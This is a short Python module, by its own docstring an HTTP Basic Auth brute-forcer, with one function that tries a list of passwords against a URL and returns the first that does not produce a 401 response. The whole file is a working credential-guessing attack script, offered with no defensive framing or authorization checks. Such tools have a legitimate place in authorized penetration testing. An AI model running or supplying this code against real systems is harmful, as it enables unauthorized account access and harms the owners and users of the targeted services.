"""HTTP Basic Auth brute-forcer using requests."""
from typing import Iterable, Tuple, Optional
import requests


def try_basic_auth(
    url: str,
    username: str,
    passwords: Iterable[str],
    timeout: float = 5.0
) -> Tuple[Optional[str], Optional[requests.Response]]:
    """Try a sequence of passwords for HTTP Basic Auth.

    Args:
        url: Target URL to authenticate against
        username: Username to try
        passwords: Iterable of passwords to attempt
        timeout: Request timeout in seconds

    Returns:
        Tuple of (matching_password, response) or (None, None) if no match found
    """
    for pwd in passwords:
        pwd = pwd.strip()
        if not pwd:
            continue
        try:
            r = requests.get(url, auth=(username, pwd), timeout=timeout, allow_redirects=False)
            # 401 = Unauthorized (invalid creds); other status may indicate success
            if r.status_code != 401:
                return pwd, r
        except requests.RequestException:
            continue
    return None, None
